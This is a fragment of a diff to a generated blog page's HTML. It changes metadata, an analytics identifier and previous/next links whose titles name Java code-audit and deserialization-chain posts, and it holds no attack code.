-  
-  
-  
-
-  
-  
-    
-  
-
-  
-    
-  
-
-  
-
-  
-    
-  
-
-  
-    
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  <div class="flex flex-row flex-wrap items-center">
-    
-    
-      <time datetime="2025-10-19T00:00:00&#43;00:00">19 October 2025</time><span class="px-2 text-primary-500">&middot;</span><span>305 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
-    
-
-    
-    
-  </div>
-
-  
-
-  
-  
-    <div class="flex flex-row flex-wrap items-center">
-      
-        
-      
-        
-          
-        
-      
-        
-      
-        
-          
-            
-              <a class="relative mt-[0.5rem] mr-2" href="/tags/php/"
-                ><span class="flex cursor-pointer">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Php
-  </span>
-</span>
-</a
-              >
-            
-          
-        
-      
-    </div>
-  
-
-  
-  
-
-
-
-    </div>
-    
-  </div>
-  <div class="px-6 pt-4 pb-2"></div>
-</div>
-
-      
     </section>
   
 
@@ -1737,8 +1741,8 @@ public void doFilter(ServletRequest request, ServletResponse response, FilterCha
           type="text/javascript"
           src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
           integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
-          data-oid="views_posts\code3javaee.md"
-          data-oid-likes="likes_posts\code3javaee.md"></script>
+          data-oid="views_posts\memory.md"
+          data-oid-likes="likes_posts\memory.md"></script>
       
     </section>
 
@@ -1754,7 +1758,7 @@ public void doFilter(ServletRequest request, ServletResponse response, FilterCha
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/posts/code2javaee/">
+            <a class="flex group mr-3" href="/posts/cc/">
               <span
                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -1765,22 +1769,6 @@ public void doFilter(ServletRequest request, ServletResponse response, FilterCha
               >
               <span class="flex flex-col">
                 <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >JavaEE代码审计-文件操作</span
-                >
-                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
-                  
-                    <time datetime="2025-10-23T00:00:00&#43;00:00">23 October 2025</time>
-                  
-                </span>
-              </span>
-            </a>
-          
-        </span>
-        <span>
-          
-            <a class="flex text-right group ml-3" href="/posts/cc/">
-              <span class="flex flex-col">
-                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                   >JavaEECC1链条持续更新+fastjson1.2.24+log4j</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
@@ -1789,15 +1777,10 @@ public void doFilter(ServletRequest request, ServletResponse response, FilterCha
                   
                 </span>
               </span>
-              <span
-                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
-                >&rarr;</span
-              >
-              <span
-                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
-                >&larr;</span
-              >
             </a>
+          
+        </span>
+        <span>
           
         </span>
       </div>
